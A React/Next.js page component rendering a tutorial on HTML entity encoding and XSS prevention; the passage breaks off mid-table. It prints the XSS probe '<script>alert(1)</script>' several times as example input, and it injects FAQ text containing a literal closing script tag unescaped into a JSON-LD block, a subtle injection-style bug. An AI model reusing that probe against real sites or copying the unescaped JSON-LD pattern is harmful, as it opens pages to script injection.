'use client';
import Link from 'next/link';

/* ------------------------------------------------------------------ */
/*  HTML Entity Encoder/Decoder Online Guide                            */
/* ------------------------------------------------------------------ */

export default function HtmlEntityOnlineGuide({ lang }: { lang: string }) {
  const l = lang || 'en';
  const toolLink = `/${l}/tools/html-entity`;

  /* ---------- Essential HTML entities reference table ---------- */
  const essentialEntities: [string, string, string, string][] = [
    ['&', '&amp;', '&#38;', 'Ampersand — must always be encoded in HTML'],
    ['<', '&lt;', '&#60;', 'Less-than sign — opens an HTML tag'],
    ['>', '&gt;', '&#62;', 'Greater-than sign — closes an HTML tag'],
    ['"', '&quot;', '&#34;', 'Double quote — required in attribute values'],
    ["'", '&apos;', '&#39;', 'Single quote / apostrophe — use in attribute values'],
    ['/', '&sol;', '&#47;', 'Solidus (forward slash)'],
    ['`', '&grave;', '&#96;', 'Backtick / grave accent'],
    [' (non-break)', '&nbsp;', '&#160;', 'Non-breaking space — prevents line wrap'],
    ['\u00a9', '&copy;', '&#169;', 'Copyright symbol'],
    ['\u00ae', '&reg;', '&#174;', 'Registered trademark symbol'],
    ['\u2122', '&trade;', '&#8482;', 'Trademark (unregistered)'],
    ['\u20ac', '&euro;', '&#8364;', 'Euro currency sign'],
    ['\u00a3', '&pound;', '&#163;', 'Pound sterling'],
    ['\u00a5', '&yen;', '&#165;', 'Japanese yen'],
    ['\u00a2', '&cent;', '&#162;', 'Cent sign'],
    ['\u2013', '&ndash;', '&#8211;', 'En dash — used for ranges (2010\u20132020)'],
    ['\u2014', '&mdash;', '&#8212;', 'Em dash — used as a sentence break'],
    ['\u2018', '&lsquo;', '&#8216;', 'Left single quotation mark'],
    ['\u2019', '&rsquo;', '&#8217;', 'Right single quotation mark (also apostrophe)'],
    ['\u201c', '&ldquo;', '&#8220;', 'Left double quotation mark'],
    ['\u201d', '&rdquo;', '&#8221;', 'Right double quotation mark'],
    ['\u2026', '&hellip;', '&#8230;', 'Horizontal ellipsis (three dots)'],
    ['\u00b7', '&middot;', '&#183;', 'Middle dot / interpunct'],
    ['\u00b0', '&deg;', '&#176;', 'Degree sign'],
    ['\u00b1', '&plusmn;', '&#177;', 'Plus-minus sign'],
    ['\u00d7', '&times;', '&#215;', 'Multiplication sign'],
    ['\u00f7', '&divide;', '&#247;', 'Division sign'],
    ['\u2260', '&ne;', '&#8800;', 'Not equal to'],
    ['\u2264', '&le;', '&#8804;', 'Less-than or equal to'],
    ['\u2265', '&ge;', '&#8805;', 'Greater-than or equal to'],
    ['\u221e', '&infin;', '&#8734;', 'Infinity symbol'],
    ['\u2205', '&empty;', '&#8709;', 'Empty set'],
    ['\u03b1', '&alpha;', '&#945;', 'Greek letter alpha'],
    ['\u03b2', '&beta;', '&#946;', 'Greek letter beta'],
    ['\u03b3', '&gamma;', '&#947;', 'Greek letter gamma'],
    ['\u03c0', '&pi;', '&#960;', 'Greek letter pi'],
    ['\u03c3', '&sigma;', '&#963;', 'Greek letter sigma'],
    ['\u03a9', '&Omega;', '&#937;', 'Greek capital letter omega'],
    ['\u2192', '&rarr;', '&#8594;', 'Rightwards arrow'],
    ['\u2190', '&larr;', '&#8592;', 'Leftwards arrow'],
    ['\u2191', '&uarr;', '&#8593;', 'Upwards arrow'],
    ['\u2193', '&darr;', '&#8595;', 'Downwards arrow'],
    ['\u2665', '&hearts;', '&#9829;', 'Black heart suit'],
    ['\u2660', '&spades;', '&#9824;', 'Black spade suit'],
    ['\u2666', '&diams;', '&#9830;', 'Black diamond suit'],
    ['\u2663', '&clubs;', '&#9827;', 'Black club suit'],
    ['\u00e9', '&eacute;', '&#233;', 'Latin small e with acute'],
    ['\u00e0', '&agrave;', '&#224;', 'Latin small a with grave'],
    ['\u00fc', '&uuml;', '&#252;', 'Latin small u with diaeresis'],
    ['\u00f1', '&ntilde;', '&#241;', 'Latin small n with tilde (Spanish)'],
    ['\u00e7', '&ccedil;', '&#231;', 'Latin small c with cedilla'],
  ];

  /* ---------- FAQ items ---------- */
  const faqItems = [
    {
      q: 'What is an HTML entity?',
      a: 'An HTML entity is a string that begins with an ampersand (&) and ends with a semicolon (;), used to represent characters that have special meaning in HTML or that cannot be typed directly. For example, &amp;amp; renders as & and &amp;lt; renders as <. HTML entities exist in two forms: named entities (like &amp;copy; for the copyright symbol) and numeric entities (decimal like &amp;#169; or hexadecimal like &amp;#xA9;).',
    },
    {
      q: 'Why must I encode & < > " in HTML?',
      a: 'These four characters have special syntactic meaning in HTML. The ampersand (&) starts entity references and attribute values. The less-than sign (<) opens HTML tags. The greater-than sign (>) closes HTML tags. The double quote (") delimits attribute values. If you include these characters literally in HTML content or attributes without encoding them, the browser may misinterpret your HTML structure, causing rendering errors or security vulnerabilities.',
    },
    {
      q: 'What is the difference between named and numeric HTML entities?',
      a: 'Named entities use a mnemonic name (e.g., &amp;copy; for copyright, &amp;nbsp; for non-breaking space). Numeric entities use the Unicode code point in decimal (&amp;#169;) or hexadecimal (&amp;#xA9;). Named entities are more readable but only exist for a subset of characters. Numeric entities work for any Unicode character. Both forms are equally valid in all modern browsers.',
    },
    {
      q: 'Does &apos; work in HTML?',
      a: "&apos; (apostrophe entity) was not part of the original HTML 4 specification but was added in HTML5 and XHTML. It is now universally supported in modern browsers. However, for maximum compatibility with older HTML parsers, many developers use the numeric form &#39; or simply the literal apostrophe character inside double-quoted attributes. In XHTML documents, &apos; has always been valid because XHTML is an XML application.",
    },
    {
      q: 'What is &nbsp; and when should I use it?',
      a: '&nbsp; is a non-breaking space character (Unicode U+00A0). Unlike a regular space, it prevents the browser from inserting a line break at that position, and unlike regular spaces, consecutive &nbsp; characters are rendered (regular spaces collapse to one). Use &nbsp; sparingly: for units after numbers (e.g., 100&nbsp;km), to keep names together (e.g., Dr.&nbsp;Smith), or to prevent unwanted wrapping in table cells. Do not use it for layout spacing — use CSS margins and padding instead.',
    },
    {
      q: 'How does HTML entity encoding prevent XSS attacks?',
      a: 'Cross-Site Scripting (XSS) attacks inject malicious HTML or JavaScript into web pages. When user-supplied text is rendered in an HTML context, special characters like < > & " must be encoded as HTML entities before insertion. For example, the script tag <script>alert(1)</script> becomes harmless when the < and > are encoded as &amp;lt; and &amp;gt; — the browser displays it as literal text rather than executing it as HTML. Server-side frameworks handle this automatically when using template escaping, but raw innerHTML assignments in JavaScript bypass these protections.',
    },
    {
      q: 'What is the difference between HTML entity encoding and URL encoding?',
      a: 'HTML entity encoding converts characters using the &name; or &#code; format and is used for embedding text safely in HTML documents. URL encoding (percent encoding) converts characters using the %XX format and is used for encoding data in URIs. They serve different contexts: HTML entities go in HTML files and templates; URL encoding goes in URLs and query strings. A URL inside an HTML attribute often requires both — the URL portion is percent-encoded, and then the HTML attribute value is entity-encoded.',
    },
    {
      q: 'Which HTML entities are required vs optional?',
      a: 'Required: & must always be encoded as &amp;amp; in HTML text and attribute values. < must always be encoded as &amp;lt; in HTML text content. In HTML attribute values delimited by double quotes, " must be encoded as &amp;quot;. In HTML attribute values delimited by single quotes, apostrophes must be encoded as &amp;apos; or &amp;#39;. Optional but recommended: > can be used literally in most HTML text contexts but encoding as &amp;gt; avoids edge cases. All other characters are optional — modern browsers handle the full UTF-8 character set directly, so accented letters, emoji, and symbols can be used as-is when the document declares UTF-8 charset.',
    },
  ];

  const faqSchema = {
    '@context': 'https://schema.org',
    '@type': 'FAQPage',
    mainEntity: faqItems.map(item => ({
      '@type': 'Question',
      name: item.q,
      acceptedAnswer: {
        '@type': 'Answer',
        text: item.a,
      },
    })),
  };

  const codeStyle: React.CSSProperties = {
    background: '#f1f5f9',
    padding: '1px 5px',
    borderRadius: 3,
    fontFamily: 'monospace',
    fontSize: '0.9em',
  };

  const blockCodeStyle: React.CSSProperties = {
    display: 'block',
    background: '#0f172a',
    color: '#e2e8f0',
    borderRadius: 8,
    padding: '20px 24px',
    marginBottom: 24,
    overflowX: 'auto',
    fontFamily: "'Fira Code', 'Cascadia Code', 'Consolas', monospace",
    fontSize: 14,
    lineHeight: 1.7,
    whiteSpace: 'pre',
  };

  const sectionHeadStyle: React.CSSProperties = {
    fontSize: 26,
    fontWeight: 800,
    marginTop: 56,
    marginBottom: 16,
    paddingBottom: 8,
    borderBottom: '2px solid #e2e8f0',
  };

  const subHeadStyle: React.CSSProperties = {
    fontSize: 20,
    fontWeight: 700,
    marginTop: 32,
    marginBottom: 10,
  };

  const pStyle: React.CSSProperties = {
    fontSize: 15,
    marginBottom: 14,
    lineHeight: 1.8,
  };

  const tableStyle: React.CSSProperties = {
    width: '100%',
    borderCollapse: 'collapse',
    marginBottom: 32,
    fontSize: 14,
  };

  const thStyle: React.CSSProperties = {
    background: '#1e293b',
    color: '#f8fafc',
    padding: '10px 14px',
    textAlign: 'left',
    fontWeight: 700,
    fontSize: 13,
  };

  const tdStyle: React.CSSProperties = {
    padding: '9px 14px',
    borderBottom: '1px solid #e2e8f0',
    verticalAlign: 'top',
  };

  const monoTdStyle: React.CSSProperties = {
    ...tdStyle,
    fontFamily: 'monospace',
    fontSize: 13,
  };

  const noteStyle: React.CSSProperties = {
    background: '#fffbeb',
    border: '1px solid #fcd34d',
    borderRadius: 8,
    padding: '14px 18px',
    marginBottom: 24,
    fontSize: 14,
  };

  const dangerStyle: React.CSSProperties = {
    background: '#fef2f2',
    border: '1px solid #fca5a5',
    borderRadius: 8,
    padding: '14px 18px',
    marginBottom: 24,
    fontSize: 14,
  };

  const successStyle: React.CSSProperties = {
    background: '#f0fdf4',
    border: '1px solid #86efac',
    borderRadius: 8,
    padding: '14px 18px',
    marginBottom: 24,
    fontSize: 14,
  };

  return (
    <article style={{ maxWidth: 820, margin: '0 auto', lineHeight: 1.75 }}>
      {/* FAQ Schema.org JSON-LD */}
      <script
        type="application/ld+json"
        dangerouslySetInnerHTML={{ __html: JSON.stringify(faqSchema) }}
      />

      {/* ---- TL;DR Box ---- */}
      <div style={{
        background: '#f0f9ff',
        border: '1px solid #bae6fd',
        borderRadius: 8,
        padding: '16px 20px',
        marginBottom: 32,
      }}>
        <p style={{ fontWeight: 700, fontSize: 16, marginBottom: 8, marginTop: 0 }}>TL;DR</p>
        <p style={{ margin: 0, fontSize: 15 }}>
          HTML entities convert special characters (like{' '}
          <code style={codeStyle}>&amp;</code>, <code style={codeStyle}>&lt;</code>,{' '}
          <code style={codeStyle}>&gt;</code>, <code style={codeStyle}>&quot;</code>) into
          browser-safe representations. Always encode <code style={codeStyle}>&amp;</code> as{' '}
          <code style={codeStyle}>&amp;amp;</code> and <code style={codeStyle}>&lt;</code> as{' '}
          <code style={codeStyle}>&amp;lt;</code> in HTML. Use named entities for readability and
          numeric entities for any Unicode character. Proper encoding is the primary defense against
          XSS attacks. Modern UTF-8 pages can embed most characters directly, but the five
          HTML-special characters still require encoding.{' '}
          <Link href={toolLink} style={{ color: '#2563eb', fontWeight: 600 }}>
            Try our free HTML Entity Encoder/Decoder &rarr;
          </Link>
        </p>
      </div>

      {/* ---- Key Takeaways ---- */}
      <div style={{
        background: '#f8fafc',
        borderRadius: 8,
        padding: '16px 20px',
        marginBottom: 40,
      }}>
        <p style={{ fontWeight: 700, fontSize: 16, marginBottom: 12, marginTop: 0 }}>Key Takeaways</p>
        <ul style={{ margin: 0, paddingLeft: 20, fontSize: 15, display: 'flex', flexDirection: 'column', gap: 6 }}>
          <li>Always encode <code style={codeStyle}>&amp;</code>, <code style={codeStyle}>&lt;</code>, <code style={codeStyle}>&gt;</code>, <code style={codeStyle}>&quot;</code>, and <code style={codeStyle}>&apos;</code> when inserting user data into HTML.</li>
          <li>Named entities (<code style={codeStyle}>&amp;copy;</code>) are readable; numeric entities (<code style={codeStyle}>&amp;#169;</code> or <code style={codeStyle}>&amp;#xA9;</code>) work for any Unicode character.</li>
          <li>HTML entity encoding is different from URL percent-encoding — they serve different contexts.</li>
          <li>Server-side frameworks auto-escape HTML in templates; but raw DOM <code style={codeStyle}>innerHTML</code> in JavaScript does not.</li>
          <li>XSS attacks exploit unencoded HTML insertion; entity-encoding user input neutralizes them.</li>
          <li>Modern UTF-8 documents can use accented letters and emoji directly — only the 5 HTML-special characters need encoding.</li>
          <li><code style={codeStyle}>&amp;nbsp;</code> (non-breaking space) should be used for semantic line-break prevention, not for visual spacing.</li>
        </ul>
      </div>

      {/* ---- Section 1: What Are HTML Entities? ---- */}
      <h2 style={sectionHeadStyle}>What Are HTML Entities?</h2>
      <p style={pStyle}>
        An <strong>HTML entity</strong> is a special text sequence used in HTML documents to represent
        characters that either have a reserved meaning in HTML syntax or cannot be typed directly on
        a standard keyboard. Every entity begins with an ampersand (<code style={codeStyle}>&amp;</code>)
        and ends with a semicolon (<code style={codeStyle}>;</code>).
      </p>
      <p style={pStyle}>
        HTML entities were introduced because the HTML specification originally required documents to
        use only the 7-bit ASCII character set, yet authors needed a way to include accented letters,
        currency signs, mathematical symbols, and special punctuation. Today, HTML5 documents nearly
        universally declare UTF-8 encoding, which means most characters can be embedded directly. However,
        the five characters with special HTML significance still <em>must</em> be encoded as entities:
      </p>
      <div style={{
        background: '#f8fafc',
        border: '1px solid #e2e8f0',
        borderRadius: 8,
        padding: '16px 24px',
        marginBottom: 24,
        display: 'grid',
        gridTemplateColumns: 'repeat(auto-fill, minmax(200px, 1fr))',
        gap: 12,
      }}>
        {[
          { char: '&', entity: '&amp;amp;', label: 'Ampersand' },
          { char: '<', entity: '&amp;lt;', label: 'Less-than' },
          { char: '>', entity: '&amp;gt;', label: 'Greater-than' },
          { char: '"', entity: '&amp;quot;', label: 'Double quote' },
          { char: "'", entity: '&amp;apos;', label: 'Apostrophe' },
        ].map(({ char, entity, label }) => (
          <div key={label} style={{ background: '#fff', border: '1px solid #e2e8f0', borderRadius: 6, padding: '10px 14px' }}>
            <div style={{ fontFamily: 'monospace', fontSize: 22, fontWeight: 700, color: '#2563eb' }}>{char}</div>
            <div style={{ fontFamily: 'monospace', fontSize: 13, color: '#64748b', marginTop: 4 }}>{entity}</div>
            <div style={{ fontSize: 12, color: '#94a3b8', marginTop: 2 }}>{label}</div>
          </div>
        ))}
      </div>

      <p style={pStyle}>
        There are two types of HTML entities:
      </p>
      <ul style={{ fontSize: 15, paddingLeft: 22, marginBottom: 20, display: 'flex', flexDirection: 'column', gap: 8 }}>
        <li>
          <strong>Named entities</strong> — use a descriptive name enclosed in <code style={codeStyle}>&amp;</code> and <code style={codeStyle}>;</code>.
          Example: <code style={codeStyle}>&amp;copy;</code> renders as &copy;. Only predefined characters have named entities.
        </li>
        <li>
          <strong>Numeric entities</strong> — use the Unicode code point in decimal (<code style={codeStyle}>&amp;#169;</code>)
          or hexadecimal (<code style={codeStyle}>&amp;#xA9;</code>) form. Works for every Unicode character.
        </li>
      </ul>
      <p style={pStyle}>
        <Link href={toolLink} style={{ color: '#2563eb', fontWeight: 600 }}>
          Encode or decode HTML entities instantly with our free online tool &rarr;
        </Link>
      </p>

      {/* ---- Section 2: Essential HTML Entities Reference Table ---- */}
      <h2 style={sectionHeadStyle}>Essential HTML Entities Reference Table</h2>
      <p style={pStyle}>
        The table below covers the most important HTML entities across several categories: security-critical
        characters, typography, currency, math, Greek letters, arrows, and accented Latin characters.
        All modern browsers support these entities.
      </p>
      <div style={{ overflowX: 'auto', marginBottom: 32 }}>
        <table style={tableStyle}>
          <thead>
            <tr>
              <th style={thStyle}>Character</th>
              <th style={thStyle}>Named Entity</th>
              <th style={thStyle}>Numeric Entity</th>
              <th style={thStyle}>Description / Use Case</th>
            </tr>
          </thead>
          <tbody>
            {essentialEntities.map(([char, named, numeric, desc], i) => (
              <tr key={i} style={{ background: i % 2 === 0 ? '#fff' : '#f8fafc' }}>
                <td style={{ ...tdStyle, fontFamily: 'monospace', fontSize: 18, color: '#1e293b', fontWeight: 600, textAlign: 'center', minWidth: 60 }}>{char}</td>
                <td style={monoTdStyle}>{named}</td>
                <td style={monoTdStyle}>{numeric}</td>
                <td style={{ ...tdStyle, color: '#374151', fontSize: 13 }}>{desc}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      {/* ---- Section 3: Named vs Numeric Entities ---- */}
      <h2 style={sectionHeadStyle}>Named Entities vs Numeric Entities</h2>
      <p style={pStyle}>
        HTML entities come in two syntactic forms, each with distinct trade-offs. Understanding when
        to use each form is key to writing maintainable, portable HTML.
      </p>

      <h3 style={subHeadStyle}>Named Entities</h3>
      <p style={pStyle}>
        Named entities use human-readable mnemonic names. The W3C HTML5 specification defines over
        2,000 named character references. They are case-sensitive:
        <code style={codeStyle}>&amp;lt;</code> is valid but <code style={codeStyle}>&amp;LT;</code> (fully
        uppercase) is not defined in HTML5 (though some browsers accept it).
      </p>
      <code style={blockCodeStyle}>{`<!-- Named entities — readable and self-documenting -->
<p>Copyright &copy; 2025 DevToolBox &mdash; All rights reserved.</p>
<p>Price: &pound;49.99 or &euro;59.99</p>
<p>Evaluate: x &le; y &ne; z</p>
<p>Reaction: I &hearts; JavaScript</p>`}</code>

      <p style={pStyle}>
        Named entities are the best choice when: the entity is frequently used and recognizable,
        you want your HTML source to be readable without constant reference to code charts, and
        you are targeting modern browsers (all of them support the HTML5 named character references).
      </p>

      <h3 style={subHeadStyle}>Numeric Entities — Decimal</h3>
      <p style={pStyle}>
        Decimal numeric entities use the Unicode code point in base 10. Format:{' '}
        <code style={codeStyle}>&amp;#[decimal];</code>. They work for <em>any</em> Unicode character,
        even those without named entities.
      </p>
      <code style={blockCodeStyle}>{`<!-- Decimal numeric entities -->
<p>Copyright &#169; 2025</p>          <!-- same as &copy; -->
<p>Trademark &#8482;</p>               <!-- &trade; -->
<p>Snowman: &#9731;</p>                <!-- no named entity! -->
<p>Musical note: &#9835;</p>           <!-- no named entity! -->
<p>Emoji-like: &#128512;</p>           <!-- U+1F600 grinning face -->`}</code>

      <h3 style={subHeadStyle}>Numeric Entities — Hexadecimal</h3>
      <p style={pStyle}>
        Hexadecimal numeric entities use the code point in base 16. Format:{' '}
        <code style={codeStyle}>&amp;#x[hex];</code>. Developers who work with Unicode charts often
        prefer hex because Unicode values are typically specified in hex (U+00A9, U+20AC, etc.).
      </p>
      <code style={blockCodeStyle}>{`<!-- Hexadecimal numeric entities — map directly to Unicode code points -->
<p>Copyright &#xA9; 2025</p>           <!-- U+00A9 -->
<p>Euro sign: &#x20AC;</p>             <!-- U+20AC -->
<p>Em dash &#x2014; separates ideas</p> <!-- U+2014 -->
<p>Right arrow: &#x2192;</p>           <!-- U+2192 -->
<p>Snowflake: &#x2746;</p>             <!-- U+2746 -->`}</code>

      <div style={noteStyle}>
        <strong>Tip:</strong> In modern UTF-8 HTML5 documents, you can use Unicode characters directly
        without entities (e.g., type &copy; directly as the © character). Entities are still
        required for the 5 HTML-special characters and are useful when your text editor cannot
        handle certain character sets or when generating HTML programmatically.
      </div>

      {/* ---- Section 4: When to Encode and When Not To ---- */}
      <h2 style={sectionHeadStyle}>When to Encode vs When Not To</h2>
      <p style={pStyle}>
        Knowing exactly when HTML entity encoding is mandatory, when it is recommended, and when it
        is unnecessary helps you write secure, correct HTML without over-encoding.
      </p>

      <h3 style={subHeadStyle}>Always Encode (Required)</h3>
      <div style={dangerStyle}>
        <strong>These four characters MUST be encoded in all HTML content contexts:</strong>
        <ul style={{ marginTop: 10, marginBottom: 0, paddingLeft: 20 }}>
          <li><code>&amp;</code> &#8594; <code>&amp;amp;</code> — in text content AND in attribute values</li>
          <li><code>&lt;</code> &#8594; <code>&amp;lt;</code> — in text content (opens a tag otherwise)</li>
          <li><code>&gt;</code> &#8594; <code>&amp;gt;</code> — in text content (recommended; technically required after <code>]]</code>)</li>
          <li><code>&quot;</code> &#8594; <code>&amp;quot;</code> — when the attribute value is delimited by double quotes</li>
          <li><code>&apos;</code> &#8594; <code>&amp;apos;</code> or <code>&amp;#39;</code> — when inside single-quote-delimited attributes</li>
        </ul>
      </div>

      <code style={blockCodeStyle}>{`<!-- WRONG: unencoded ampersand breaks HTML parsing -->
<a href="https://example.com?foo=1&bar=2">Link</a>

<!-- CORRECT: encode the ampersand -->
<a href="https://example.com?foo=1&amp;bar=2">Link</a>

<!-- WRONG: unencoded < in text creates a broken tag -->
<p>if a < b then c > d</p>

<!-- CORRECT: encode angle brackets -->
<p>if a &lt; b then c &gt; d</p>

<!-- WRONG: unescaped quote terminates attribute early -->
<input value="Say "hello" to me">

<!-- CORRECT: encode the inner double quotes -->
<input value="Say &quot;hello&quot; to me">

<!-- ALTERNATIVE: use single quotes for the attribute -->
<input value='Say "hello" to me'>`}</code>

      <h3 style={subHeadStyle}>Encode When Generating HTML Dynamically</h3>
      <p style={pStyle}>
        Any time user-supplied text, database content, or external data is inserted into an HTML
        document — whether via server-side templates or client-side DOM manipulation — special
        characters must be entity-encoded before insertion. This is the primary XSS prevention mechanism.
      </p>
      <code style={blockCodeStyle}>{`<!-- If userInput = '<script>alert(1)</script>' -->

<!-- DANGEROUS — raw innerHTML injection -->
<div id="output"></div>
<script>
  document.getElementById('output').innerHTML = userInput; // XSS!
</script>

<!-- SAFE — use textContent which does NOT parse HTML -->
<script>
  document.getElementById('output').textContent = userInput; // safe
</script>

<!-- SAFE — encode before inserting as innerHTML -->
<script>
  function encodeHtml(str) {
    return str
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#39;');
  }
  document.getElementById('output').innerHTML = encodeHtml(userInput);
</script>`}</code>

      <h3 style={subHeadStyle}>When Encoding Is Optional (UTF-8 Documents)</h3>
      <p style={pStyle}>
        In modern HTML5 documents with <code style={codeStyle}>&lt;meta charset="UTF-8"&gt;</code>,
        you can embed accented letters, currency signs, emoji, and most Unicode characters directly
        in your source. Using <code style={codeStyle}>&amp;eacute;</code> for &eacute; or{' '}
        <code style={codeStyle}>&amp;euro;</code> for &euro; is optional — the literal characters are
        equally valid. Encoding everything is unnecessary noise.
      </p>
      <code style={blockCodeStyle}>{`<!-- HTML5 UTF-8 document — these are equivalent -->
<p>Caf&eacute; au lait costs &euro;3.50</p>
<p>Café au lait costs €3.50</p>

<!-- Both render identically in all modern browsers -->
<!-- The second form is preferred in UTF-8 source files -->`}</code>

      <h3 style={subHeadStyle}>Context-Specific Encoding Rules</h3>
      <div style={{ overflowX: 'auto', marginBottom: 24 }}>
        <table style={tableStyle}>
          <thead>
            <tr>
              <th style={thStyle}>HTML Context</th>
              <th style={thStyle}>Characters to Encode</th>
              <th style={thStyle}>Example</th>
            </tr>
          </thead>
          <tbody>
            {[
              ['Text content (between tags)', '& < >', '<p>Tom &amp; Jerry &lt;3</p>'],
              ['Double-quoted attribute', '& < " (> optional)', '<a href="x?a=1&amp;b=2">'],
              ['Single-quoted attribute', '& < \' (> optional)', "<img alt='Tom &amp; Jerry'>"],
              ['Unquoted attribute', '& < > " \' space tab', '(avoid unquoted attributes)'],
              ['style attribute (CSS in HTML)', '& < " in CSS strings', '<div style="content: &quot;x&quot;">'],
              ['JavaScript string in event handler', '& < > " \'', '<div onclick="fn(&amp;quot;x&amp;quot;)">'],
              ['URL in href/src', 'Percent-encode URL; then entity-encode & in HTML', '<a href="/?q=a%20b&amp;page=1">'],
              ['CDATA sections', ']]> must be avoided', '(XML/XHTML specific)'],
            ].map(([ctx, chars, example], i) => (
              <tr key={i} style={{ background: i % 2 === 0 ? '#fff' : '#f8fafc' }}>
                <td style={{ ...tdStyle, fontWeight: 600, fontSize: 13 }}>{ctx}</td>
                <td style={monoTdStyle}>{chars}</td>
                <td style={{ ...tdStyle, fontFamily: 'monospace', fontSize: 12, color: '#4b5563' }}>{example}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      {/* ---- Section 5: HTML Entities vs URL Encoding ---- */}
      <h2 style={sectionHeadStyle}>HTML Entity Encoding vs URL Encoding</h2>
      <p style={pStyle}>
        Developers often confuse HTML entity encoding and URL percent-encoding because both deal with
        special characters and often appear together. They are fundamentally different mechanisms
        for different purposes:
      </p>
      <div style={{ overflowX: 'auto', marginBottom: 24 }}>
        <table style={tableStyle}>
          <thead>
            <tr>
              <th style={thStyle}>Property</th>
              <th style={thStyle}>HTML Entity Encoding</th>
              <th style={thStyle}>URL Percent Encoding</th>
            </tr>
          </thead>
          <tbody>
            {[
              ['Format', '&amp;name; or &amp;#code;', '%XX (hex byte)'],
              ['Context', 'HTML documents and templates', 'URLs, query strings, form data'],
              ['Standard', 'HTML5 Named Character References', 'RFC 3986'],
              ['Example: space', '&amp;#32; or &amp;nbsp;', '%20 or + (in form data)'],
              ['Example: &', '&amp;amp;', '%26'],
              ['Example: <', '&amp;lt;', '%3C'],
              ['Example: ©', '&amp;copy; or &amp;#169;', '%C2%A9 (UTF-8 bytes)'],
              ['Example: €', '&amp;euro; or &amp;#8364;', '%E2%82%AC (UTF-8 bytes)'],
            ].map(([prop, html, url], i) => (
              <tr key={i} style={{ background: i % 2 === 0 ? '#fff' : '#f8fafc' }}>
                <td style={{ ...tdStyle, fontWeight: 600 }}>{prop}</td>
                <td style={monoTdStyle}>{html}</td>
                <td style={monoTdStyle}>{url}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      <p style={pStyle}>
        A common scenario requires <em>both</em> types of encoding. When embedding a URL in an
        HTML attribute, the URL itself may contain percent-encoded characters, and the HTML attribute
        may also require HTML entity encoding of the ampersand in query strings:
      </p>
      <code style={blockCodeStyle}>{`<!-- URL with query parameters in an HTML attribute -->
<!-- Step 1: URL encode the query values -->
<!-- "hello world" -> "hello%20world" -->
<!-- Step 2: HTML entity encode the & separating parameters -->

<!-- WRONG — bare & breaks HTML validation -->
<a href="https://example.com/search?q=hello%20world&lang=en">Search</a>

<!-- CORRECT — & in HTML attribute must be &amp; -->
<a href="https://example.com/search?q=hello%20world&amp;lang=en">Search</a>

<!-- Note: URL path characters ARE percent-encoded; HTML attribute & IS entity-encoded -->
<!-- They are two separate encoding layers applied in their respective contexts -->`}</code>

      <p style={pStyle}>
        Use our{' '}
        <Link href={`/${l}/tools/url-encoder`} style={{ color: '#2563eb' }}>URL Encoder tool</Link> for
        percent-encoding and our{' '}
        <Link href={toolLink} style={{ color: '#2563eb' }}>HTML Entity Encoder tool</Link> for
        HTML entity encoding — they address different encoding needs.
      </p>

      {/* ---- Section 6: HTML Entity Encoding in JavaScript ---- */}
      <h2 style={sectionHeadStyle}>HTML Entity Encoding in JavaScript</h2>
      <p style={pStyle}>
        JavaScript does not have a built-in HTML escape function, but there are several correct and
        idiomatic approaches. Choosing the right API matters for both security and correctness.
      </p>

      <h3 style={subHeadStyle}>The Correct Way: textContent and DOM APIs</h3>
      <p style={pStyle}>
        The safest and most straightforward method is to use the DOM APIs that automatically handle
        encoding for you:
      </p>
      <code style={blockCodeStyle}>{`// --- Safe: textContent sets plain text, no HTML parsing ---
const div = document.createElement('div');
div.textContent = '<script>alert("xss")</script>';
console.log(div.innerHTML);
// Output: &lt;script&gt;alert("xss")&lt;/script&gt;

// --- Safe: createTextNode for dynamic content ---
const textNode = document.createTextNode('Tom & Jerry <3');
document.body.appendChild(textNode);
// Renders as: Tom & Jerry <3  (no HTML interpretation)

// --- Safe: setAttribute for setting attribute values ---
const a = document.createElement('a');
a.setAttribute('title', 'Tom & Jerry <fansite>');
// Attribute is set correctly; browser handles the encoding internally`}</code>

      <h3 style={subHeadStyle}>Manual Encoding Function (When innerHTML Is Required)</h3>
      <p style={pStyle}>
        When you need to construct HTML strings (e.g., to set innerHTML with mixed text and markup),
        create a reliable encode function:
      </p>
      <code style={blockCodeStyle}>{`/**
 * Encode HTML special characters to prevent XSS.
 * Only encodes the 5 characters that have HTML significance.
 */
function encodeHtml(str: string): string {
  return String(str)
    .replace(/&/g, '&amp;')    // Must be FIRST — otherwise &lt; becomes &amp;lt;
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');   // Use &#39; for broader compatibility than &apos;
}

/**
 * Decode HTML entities back to plain text.
 */
function decodeHtml(html: string): string {
  const txt = document.createElement('textarea');
  txt.innerHTML = html;
  return txt.value;
}

// Usage examples:
encodeHtml('<script>alert("xss")</script>');
// => '&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;'

encodeHtml("Tom & Jerry's adventure");
// => 'Tom &amp; Jerry&#39;s adventure'

decodeHtml('&lt;strong&gt;Hello &amp; World&lt;/strong&gt;');
// => '<strong>Hello & World</strong>'`}</code>

      <h3 style={subHeadStyle}>Using DOMParser for Safe HTML Parsing</h3>
      <code style={blockCodeStyle}>{`// DOMParser: parse HTML safely and extract text
function htmlToText(html: string): string {
  const doc = new DOMParser().parseFromString(html, 'text/html');
  return doc.body.textContent ?? '';
}

htmlToText('<b>Hello</b> &amp; <i>World</i>');
// => 'Hello & World'

// Alternative with template literals and tagged templates
function safeHtml(strings: TemplateStringsArray, ...values: unknown[]): string {
  return strings.reduce((result, str, i) => {
    const value = values[i - 1];
    return result + encodeHtml(String(value ?? '')) + str;
  });
}

const username = '<script>alert(1)</script>';
const greeting = safeHtml\`<p>Welcome, \${username}!</p>\`;
// => '<p>Welcome, &lt;script&gt;alert(1)&lt;/script&gt;!</p>'`}</code>

      <h3 style={subHeadStyle}>Libraries for HTML Encoding in JavaScript</h3>
      <div style={{ overflowX: 'auto', marginBottom: 24 }}>
        <table style={tableStyle}>
          <thead>
            <tr>
              <th style={thStyle}>Library</th>
              <th style={thStyle}>Function</th>
              <th style={thStyle}>Notes</th>
            </tr>
          </thead>
          <tbody>
            {[
              ['he', 'he.encode() / he.decode()', 'Full HTML entity encoder/decoder — supports all named + numeric entities'],
              ['entities', 'encodeHTML() / decodeHTML()', 'Lightweight; supports HTML4, HTML5, and XML entities'],
